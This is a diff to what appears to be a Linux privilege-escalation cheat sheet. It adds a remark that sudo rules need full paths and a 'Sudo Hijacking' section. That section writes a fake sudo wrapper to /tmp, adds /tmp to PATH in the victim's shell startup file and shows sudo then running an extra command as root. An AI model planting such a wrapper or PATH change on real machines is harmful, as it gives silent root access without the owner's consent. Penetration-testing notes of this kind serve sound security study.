@@ -86,6 +86,8 @@ Also use LD_PRELOAD variable
 
 ### Sudo command without path
 
+_(already fixed because must be set /etc/sudoers with fully-qualified path name EX: ```test ALL=(ALL) NOPASSWD: /usr/bin/less```)_
+
 When a single command such as ```ls```, ```cat``` have sudo permission. User can exploit it to get root by changing PATH.
 
 ```python
@@ -135,6 +137,23 @@ sudo -i
 #<ctrl>+c
 ./exploit.sh
 sudo -i
+```
+
+### Sudo Hijacking
+
+```python
+cat >/tmp/sudo <<EOF
+#!/bin/bash
+/usr/bin/sudo whoami > /tmp/privesc # malicious command
+/usr/bin/sudo "$1" "${@:2}"
+EOF
+chmod +x /tmp/sudo
+echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other
+
+# From the victim
+zsh
+echo $PATH
+sudo ls
 ```
 
 ## SUID
